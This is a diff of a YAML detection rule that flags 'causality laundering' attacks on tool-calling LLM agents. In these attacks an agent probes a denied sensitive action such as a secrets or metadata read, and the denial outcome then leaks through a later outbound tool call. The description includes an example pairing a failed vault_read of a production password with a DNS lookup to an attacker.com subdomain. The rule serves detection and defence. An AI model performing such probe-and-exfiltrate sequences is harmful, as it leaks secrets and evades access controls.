@@ -1,38 +1,16 @@
 id: rp-040
 name: "Causality Laundering: Denial-Feedback Leakage Detector"
 version: "0.3.0"
-description: >
-  Detects causality laundering attacks (arXiv:2604.04035, Apr 2026) where an
-  adversary causes a tool-calling LLM agent to probe a protected/denied action,
-  infers private information from the denial outcome (existence oracle, permission
-  boundary leakage), and then exfiltrates the inferred information through a
-  subsequent seemingly-benign outbound tool call within the same session.
-  This attack evades flat provenance tracking because the leaked information arises
-  from the causal influence of the denied action, not direct data flow. The paper
-  introduces ARM (Agentic Reference Monitor) with counterfactual edges; this rule
-  detects the behavioral signature at the CIM event layer without full ARM
-  instrumentation.
-  Detection: temporal self-JOIN over tool_complete(tool_success=false, sensitive tool)
-  followed within 3 minutes by tool_invoke(outbound/communication tool) in the
-  same session_id + run_id. Sensitive probes include file, secret, DB, memory,
-  credential access, cloud metadata IMDS endpoints, and secrets-manager tools.
-  Outbound channels include HTTP, email, Slack, webhook, Telegram, DNS resolution,
-  logging tools, and upload/publish actions.
-  v0.3.0 extends sensitive probe coverage to include cloud secrets manager API tools
-  (vault_read, get_secret_value, read_config, get_env, load_key, secrets_manager,
-  kms_decrypt) and metadata IMDS tools (imds_fetch, metadata_query, cloud_metadata,
-  ec2_metadata) — these are high-value denial-oracle targets in cloud agent deployments.
-  Also extends outbound channels to include upload_file, dns_resolve, telegram_send,
-  publish_event, create_webhook, and firecrawl_scrape patterns observed in recent
-  arXiv:2604.04035 PoC demonstrations.
-  Distinct from rp-027 (cross-session leak: output reuse across sessions) and
-  rp-033 (ADAM memory extraction: systematic query manipulation) because
-  causality laundering requires a denied action as the information source.
-  References: arXiv:2604.04035 (Causality Laundering Apr 2026), OWASP LLM06:2025,
-  OWASP Agentic AI ASI03:2026 -
-  https://arxiv.org/abs/2604.04035,
+description: |
+  Detects causality laundering attacks (arXiv:2604.04035, Apr 2026) where an adversary causes a tool-calling LLM agent to probe a protected/denied action, infers private information from the denial outcome (existence oracle, permission boundary leakage), and then exfiltrates the inferred information through a subsequent seemingly-benign outbound tool call within the same session. This attack evades flat provenance tracking because the leaked information arises from the causal influence of the denied action, not direct data flow. The paper introduces ARM (Agentic Reference Monitor) with counterfactual edges; this rule detects the behavioral signature at the CIM event layer without full ARM instrumentation. Detection: temporal self-JOIN over tool_complete(tool_success=false, sensitive tool) followed within 3 minutes by tool_invoke(outbound/communication tool) in the same session_id + run_id. Sensitive probes include file, secret, DB, memory, credential access, cloud metadata IMDS endpoints, and secrets-manager tools. Outbound channels include HTTP, email, Slack, webhook, Telegram, DNS resolution, logging tools, and upload/publish actions. v0.3.0 extends sensitive probe coverage to include cloud secrets manager API tools (vault_read, get_secret_value, read_config, get_env, load_key, secrets_manager, kms_decrypt) and metadata IMDS tools (imds_fetch, metadata_query, cloud_metadata, ec2_metadata) — these are high-value denial-oracle targets in cloud agent deployments. Also extends outbound channels to include upload_file, dns_resolve, telegram_send, publish_event, create_webhook, and firecrawl_scrape patterns observed in recent arXiv:2604.04035 PoC demonstrations.
+
+  Distinct from rp-027 (cross-session leak: output reuse across sessions) and rp-033 (ADAM memory extraction: systematic query manipulation) because causality laundering requires a denied action as the information source.
+
+  References: arXiv:2604.04035 (Causality Laundering Apr 2026), OWASP LLM06:2025, OWASP Agentic AI ASI03:2026 -
+  - https://arxiv.org/abs/2604.04035,
   Example: vault_read(path="secret/prod/db_password") returns tool_success=false, followed within 90 seconds by dns_resolve(domain="d-b-e-x-i-s-t-s.attacker.com") in same session (DNS exfil of existence oracle)
-  https://owasp.org/www-project-top-10-for-large-language-model-applications/
+  - https://owasp.org/www-project-top-10-for-large-language-model-applications/
+
 severity: critical
 category: data_exfiltration_and_leakage
 fp_rate: medium
